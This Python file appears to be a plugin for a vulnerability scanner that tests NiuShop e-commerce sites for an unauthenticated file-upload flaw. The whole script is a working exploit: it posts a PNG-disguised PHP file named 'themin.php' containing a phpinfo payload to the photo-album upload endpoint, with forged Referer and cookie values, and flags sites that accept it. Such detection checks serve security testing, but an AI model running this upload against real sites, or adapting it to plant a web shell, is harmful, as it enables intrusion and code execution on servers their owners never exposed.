#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from aiohttp import FormData
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    https://xz.aliyun.com/t/3767
    """
    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url, ['./niushop/', './']):
                    url = path + 'index.php'
                    paramsGet = {"s": "/wap/upload/photoalbumupload"}
                    # paramsPost = {"file_path": "upload/goods/", "album_id": "30", "type": "1,2,3,4"}
                    # paramsMultipart = [('file_upload', ('themin.php',
                    #                                     "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\x0bIDAT\x08\x99c\xf8\x0f\x04\x00\x09\xfb\x03\xfd\xe3U\xf2\x9c\x00\x00\x00\x00IEND\xaeB`\x82<?php phpinfo(); ?>",
                    #                                     'application/octet-stream'))]
                    headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest",
                               "User-Agent": "Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0",
                               "Referer": url+"?s=/admin/goods/addgoods", "Connection": "close",
                               "Accept-Language": "en", "Accept-Encoding": "gzip, deflate"}
                    cookies = {"action": "finish"}
                    form = FormData()
                    form.add_field('file_path', 'upload/goods/')
                    form.add_field('album_id', '30')
                    form.add_field('type', '1,2,3,4')
                    form.add_field('file_upload', "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\x0bIDAT\x08\x99c\xf8\x0f\x04\x00\x09\xfb\x03\xfd\xe3U\xf2\x9c\x00\x00\x00\x00IEND\xaeB`\x82<?php phpinfo(); ?>",
                                   filename="themin.php",
                                   content_type='application/octet-stream')
                    async with session.post(url=url, data=form, params=paramsGet, headers=headers, cookies=cookies) as res:
                    # async with session.post(url=url, data=paramsPost, files=paramsMultipart, params=paramsGet, headers=headers, cookies=cookies) as res:
                        if res != None:
                            text = await res.text()
                            if "themin.php" in text and '?php phpinfo' not in text.replace("&nbsp;"," ") and "Environment Variables" not in text:
                                yield url
